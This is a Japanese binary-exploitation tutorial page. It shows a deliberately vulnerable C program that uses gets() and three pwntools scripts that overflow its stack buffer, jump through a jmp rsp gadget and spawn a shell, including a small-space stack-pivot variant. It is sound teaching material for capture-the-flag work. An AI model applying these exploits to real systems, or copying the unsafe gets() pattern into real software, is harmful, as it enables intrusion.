# Using RSP

## Source

{% file src="../../../.gitbook/assets/rsp\_shellcode.zip" caption="Shellcode with RSP" %}

```c
#include <stdio.h>

int test = 0;

int main() {
    char input[100];

    puts("Get me with shellcode and RSP!");
    gets(input);

    if(test) {
        asm("jmp *%rsp");
        return 0;
    }
    else {
        return 0;
    }
}
```

ほとんどは `jmp rsp` を存在させるための部分なので、無視して構いません。実際には呼びたくないので、条件が成立しない `if` 文になっています。

{% hint style="info" %}
バイナリ内に `jmp esp` ガジェットが存在する可能性は極めて低いのですが、代わりによく行うのは、_`jmp rsp` に相当するバイト列_ を探して、そこへジャンプすることです。シェルコードでは `jmp rsp` は `\xff\xe4` なので、実行可能セクションのどこかにこの順番のバイト列があれば、それを `jmp rsp` であるかのように使えます。
{% endhint %}

## Exploitation

前のページの説明を使って、まず自分でやってみてください。`ret` が実行された後、RSP はリターンポインタの _次_ にあるものを指すので、シェルコードはその _後ろ_ に置くことを忘れないでください。

### Solution

```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

# we use elf.search() because we don't need those instructions directly,
# just anu sequence of \xff\xe4
jmp_rsp = next(elf.search(asm('jmp rsp')))

payload = flat(
    'A' * 120,                # padding
    jmp_rsp,                 # RSP will be pointing to shellcode, so we jump there
    asm(shellcraft.sh())     # place the shellcode
)

p.sendlineafter('RSP!\n', payload)
p.interactive()
```

## Limited Space

オーバーフローできる量がいつも十分とは限りません。7、8バイトしかないこともあるでしょう。そのような場合にできるのは、RIP の後ろのシェルコードを、次のようなものと等価にすることです。

```text
sub rsp, 0x20
jmp rsp
```

ここで `0x20` は、RSP の現在の値とバッファの先頭との間のオフセットです。バッファ自体には、本体のシェルコードを置きます。やってみましょう。

```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

jmp_rsp = next(elf.search(asm('jmp rsp')))

payload = b'A' * 120
payload += p64(jmp_rsp)
payload += asm('''
    sub rsp, 10;
    jmp rsp;
''')

pause()
p.sendlineafter('RSP!\n', payload)
p.interactive()
```

`10` は仮の値にすぎません。`pause()` に到達したら radare2 でアタッチし、`ret` にブレークポイントを設定して実行を続けます。そこに到達したら、`A` の文字列の先頭を探し、それと現在の RSP の値との間のオフセットを求めます。答えは `128` です。

### Solution

```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

jmp_rsp = next(elf.search(asm('jmp rsp')))

payload = asm(shellcraft.sh())
payload = payload.ljust(120, b'A')
payload += p64(jmp_rsp)
payload += asm('''
    sub rsp, 128;
    jmp rsp;
''')        # 128 we found with r2

p.sendlineafter('RSP!\n', payload)
p.interactive()
```

シェルコードまでうまく戻る(ピボットする)ことができました。しかも、すべてのアドレスが相対的なので、完全に確実です。純粋なシェルコードだけで ASLR を打ち破りました。

{% hint style="warning" %}
PIE が有効だと `jmp rsp` の位置が変わるため、これはより難しくなります。PIE のベースをリークする必要があるかもしれません。
{% endhint %}
